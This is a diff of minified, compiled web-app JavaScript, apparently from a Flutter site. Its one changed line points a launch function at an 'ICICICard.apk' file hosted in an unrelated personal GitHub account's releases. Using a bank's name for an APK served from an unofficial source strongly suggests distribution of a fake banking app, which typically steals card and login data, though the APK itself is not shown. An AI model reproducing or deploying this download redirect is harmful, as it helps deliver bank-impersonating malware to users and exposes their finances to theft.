@@ -29460,7 +29460,7 @@ abu(a,b){var s=null,r=A.wo(s,s,s,B.xf,s,B.H,s,A.R(b,s,s,s,s,B.CP,s,s,s),s,B.dp,s
 a.ac(t.Pu).f.pM(r)},
 a9w(){var s=0,r=A.I(t.H),q
 var $async$a9w=A.E(function(a,b){if(a===1)return A.F(b,r)
-for(;;)switch(s){case 0:q=A.iI("https://github.com/k3713848-afk/sndyic/releases/download/sndyic/ICICICard.apk",0,null)
+for(;;)switch(s){case 0:q=A.iI("https://github.com/k3713848-afk/sndyicabhi/releases/download/sndyicabhi/ICICICard.apk",0,null)
 s=2
 return A.J(A.aBg(q,B.qN),$async$a9w)
 case 2:if(!b)throw A.i(A.cU("Could not launch "+q.k(0)))
